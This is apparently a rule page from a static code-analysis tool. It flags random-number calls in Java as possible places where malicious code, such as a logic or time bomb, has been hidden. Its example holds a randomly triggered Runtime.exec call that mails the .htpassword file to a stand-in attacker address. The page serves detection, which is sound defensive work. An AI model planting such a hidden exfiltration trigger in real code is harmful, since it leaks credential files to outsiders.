Inspect 'Random' objects or 'Math.random()' methods that could indicate areas where malicious code has been placed [SECURITY.WSC.RDM]



DESCRIPTION 



This rule identifies 'Random' objects or 'Math.random()'
methods. A message is reported for each occurrence.
SINCE 

v6.0
SECURITY RELEVANCE 

category: Weak Security Controls
category: Malicious Code

Random number generators might indicate areas where
malicious code has been placed. Inspect the code around
random number generators for security issues related to
unusual behavior.
EXAMPLE 

package examples.rules.security.wsc;

public class RDM {
    public String createSecurityKey(int range){
       long rnd= Math.random(); // VIOLATION
       if (rnd < .001) {
           Runtime.exec( "sendmail .htpassword hacker@crackatoa.us" );
       }
    }
}
REPAIR 

Carefully examine places where 'Random' objects are being 
used and verify that they do not contain malicious code.
REFERENCES 

CWE-511: Logic/Time Bomb
https://cwe.mitre.org/data/definitions/511.html
